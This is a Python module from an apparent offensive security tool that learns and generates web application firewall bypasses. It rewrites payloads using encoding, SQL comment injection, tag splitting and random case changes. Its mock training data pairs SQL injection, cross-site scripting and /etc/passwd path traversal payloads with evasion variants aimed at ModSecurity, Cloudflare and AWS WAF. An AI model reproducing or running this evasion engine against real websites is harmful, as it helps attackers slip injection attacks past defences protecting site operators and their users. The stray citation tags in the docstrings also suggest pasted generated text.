import json
import random
from collections import defaultdict, Counter
from nexsus.utils.logger import Logger

class LearningEngine:
    def __init__(self):
        self.logger = Logger("LearningEngine")
        self.knowledge_base = defaultdict(lambda: defaultdict(Counter))
        self.success_patterns = []
        self.failure_patterns = []
        
    def load_training_data(self, sources):
        """Load data training dari berbagai sumber [citation:9]"""
        training_data = []
        
        # Format data training
        for source in sources:
            if source == 'portswigger':
                training_data.extend(self.load_portswigger_labs())
            elif source == 'hackthebox':
                training_data.extend(self.load_hackthebox_walkthroughs())
            elif source == 'bugbounty':
                training_data.extend(self.load_bugbounty_reports())
                
        return training_data
        
    def extract_patterns(self, data):
        """Ekstrak pola dari data training [citation:9]"""
        patterns = []
        
        for item in data:
            if 'payload' in item and 'bypass' in item:
                pattern = {
                    'original': item['payload'],
                    'bypassed': item['bypass'],
                    'waf_type': item.get('waf_type', 'unknown'),
                    'technique': item.get('technique', 'unknown'),
                    'context': item.get('context', '')
                }
                patterns.append(pattern)
                
        return patterns
        
    def train(self, patterns):
        """Training model berdasarkan pola yang berhasil"""
        for pattern in patterns:
            waf = pattern['waf_type']
            technique = pattern['technique']
            
            # Update knowledge base
            self.knowledge_base[waf][technique][pattern['original']] += 1
            
            if pattern not in self.success_patterns:
                self.success_patterns.append(pattern)
                
        self.logger.info(f"Training complete. {len(self.success_patterns)} patterns learned")
        
    def generate_payload(self, waf_type, original_payload, context=''):
        """Generate payload adaptif berdasarkan pembelajaran [citation:6]"""
        if waf_type not in self.knowledge_base:
            return original_payload
            
        # Cari teknik terbaik untuk WAF ini
        techniques = self.knowledge_base[waf_type]
        if not techniques:
            return original_payload
            
        # Pilih teknik dengan success rate tertinggi
        best_technique = max(techniques.keys(), 
                            key=lambda t: sum(techniques[t].values()))
        
        # Apply teknik
        if best_technique == 'encoding':
            return self.apply_encoding(original_payload, techniques[best_technique])
        elif best_technique == 'comment_injection':
            return self.apply_comment_injection(original_payload, techniques[best_technique])
        elif best_technique == 'case_manipulation':
            return self.apply_case_manipulation(original_payload, techniques[best_technique])
            
        return original_payload
        
    def apply_encoding(self, payload, technique_stats):
        """Apply encoding berdasarkan pembelajaran"""
        # Pilih encoding yang paling sukses
        best_encoding = max(technique_stats.items(), key=lambda x: x[1])[0]
        
        if 'base64' in best_encoding:
            import base64
            return base64.b64encode(payload.encode()).decode()
        elif 'url' in best_encoding:
            import urllib.parse
            return urllib.parse.quote(payload)
        elif 'unicode' in best_encoding:
            return ''.join([f'\\u{ord(c):04x}' for c in payload])
            
        return payload
        
    def apply_comment_injection(self, payload, technique_stats):
        """Apply comment injection berdasarkan pembelajaran"""
        if 'sql' in payload.lower():
            return payload.replace(' ', '/**/').replace('=', '=/**/=')
        elif 'script' in payload.lower():
            return payload.replace('script', 'scr<!-->ipt')
        return payload
        
    def apply_case_manipulation(self, payload, technique_stats):
        """Apply case manipulation berdasarkan pembelajaran"""
        if len(payload) > 3:
            # Random case
            return ''.join(c.upper() if random.choice([True, False]) else c.lower() 
                          for c in payload)
        return payload
        
    def load_portswigger_labs(self):
        """Mock data dari PortSwigger Academy"""
        return [
            {'payload': "' OR '1'='1", 'bypass': "'/**/OR/**/'1'='1", 'waf_type': 'modsecurity', 'technique': 'comment_injection'},
            {'payload': "<script>alert(1)</script>", 'bypass': "<scr<script>ipt>alert(1)</script>", 'waf_type': 'cloudflare', 'technique': 'tag_splitting'},
        ]
        
    def load_hackthebox_walkthroughs(self):
        """Mock data dari HackTheBox"""
        return [
            {'payload': "../../../etc/passwd", 'bypass': "..;/..;/etc/passwd", 'waf_type': 'aws_waf', 'technique': 'path_traversal'},
        ]
        
    def load_bugbounty_reports(self):
        """Mock data dari bug bounty reports"""
        return [
            {'payload': "admin'--", 'bypass': "admin'/*!*/--", 'waf_type': 'cloudflare', 'technique': 'mysql_comment'},
        ]
